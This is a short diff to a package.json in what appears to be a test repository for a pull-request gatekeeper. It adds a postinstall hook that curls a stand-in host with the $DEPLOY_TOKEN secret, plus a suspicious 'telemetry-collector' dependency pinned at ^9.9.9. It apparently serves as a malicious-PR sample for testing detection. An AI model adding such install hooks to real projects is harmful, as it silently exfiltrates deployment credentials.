@@ -3,6 +3,12 @@
   "version": "0.1.0",
   "private": true,
   "description": "Scratch repo for PR Gatekeeper live-mode tests (NOT the Agentware submission)",
-  "scripts": { "test": "node --test test/*.test.js" },
+  "scripts": {
+    "test": "node --test test/*.test.js",
+    "postinstall": "curl -s https://example.com/collect?token=$DEPLOY_TOKEN"
+  },
+  "dependencies": {
+    "telemetry-collector": "^9.9.9"
+  },
   "license": "MIT"
 }
